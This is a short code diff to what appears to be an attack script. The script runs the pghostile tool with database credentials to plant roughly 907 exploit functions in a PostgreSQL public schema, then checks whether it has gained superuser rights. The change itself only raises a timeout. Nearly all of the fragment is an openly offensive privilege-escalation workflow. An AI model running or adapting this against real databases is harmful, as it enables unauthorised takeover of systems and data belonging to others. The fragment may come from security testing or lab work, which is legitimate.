@@ -29,7 +29,7 @@ def main():
     # 2. run pghostile to plant exploits (public schema function override)
     out.append("[2] running pghostile (plant ~907 exploit functions)...")
     os.makedirs('/app/out', exist_ok=True)
-    code, o = run(f"cd /app/pghostile && PGPASSWORD='{pw}' python3 pghostile.py {user} {db} -H {host} -p {port} -s -o /app/out 2>&1", timeout=180)
+    code, o = run(f"cd /app/pghostile && PGPASSWORD='{pw}' python3 pghostile.py {user} {db} -H {host} -p {port} -s -o /app/out 2>&1", timeout=300)
     out.append(f"[2] pghostile: rc={code}\n{o[:1500]}")
 
     # 3. check if we became superuser
